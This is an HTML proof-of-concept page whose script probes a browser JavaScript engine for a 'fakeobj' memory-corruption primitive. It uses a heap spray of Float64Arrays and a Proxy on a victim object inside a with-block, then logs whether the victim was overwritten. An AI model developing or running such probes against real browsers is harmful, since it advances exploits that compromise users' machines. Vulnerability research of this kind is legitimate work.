<!DOCTYPE html>
<html>
<head>
    <title>FakeObj Detection PoC</title>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting fakeobj detection test...");

            // Victim object we want to overwrite
            let victim = { val: 13.37 };

            // Heap spray to increase odds of adjacency
            const sprayCount = 2000;
            let spray = [];
            for (let i = 0; i < sprayCount; i++) {
                spray.push(new Float64Array(4));
            }

            // Add victim near sprayed arrays
            spray.push(victim);
            spray.push(new Float64Array(10));

            // Trigger Proxy + with-block to touch internal scopes
            let callCount = 0;

            const handler = {
                get(target, prop, receiver) {
                    if (callCount++ > 5) return undefined;
                    log("Proxy 'get' called (" + callCount + ")");
                    log("prop = " + prop);

                    // Try to inspect receiver deeply
                    try {
                        for (let key in receiver) {
                            try {
                                const val = receiver[key];
                                log(`receiver.${key} = ${typeof val} (${val})`);
                            } catch (e) {
                                log(`Error reading receiver.${key}: ${e.message}`);
                            }
                        }
                    } catch (e) {
                        log("Error enumerating receiver keys: " + e.message);
                    }

                    return Reflect.get(...arguments);
                }
            };

            const proxy = new Proxy(victim, handler);

            (function () {
                with (proxy) {
                    try {
                        log("Accessing 'toString'...");
                        toString();
                    } catch (e) {
                        log("Exception in with-block: " + e.message);
                    }
                }
            })();

            // Check if victim object was overwritten
            log("Victim after: " + JSON.stringify(victim));
            log("Victim.val = " + victim.val);
            log("Victim.toString = " + victim.toString);
        };
    </script>
</head>
<body>
    <h2>FakeObj Detection Test</h2>
    <p>Trying to detect heap overwrites or metadata corruption.</p>
</body>
</html>
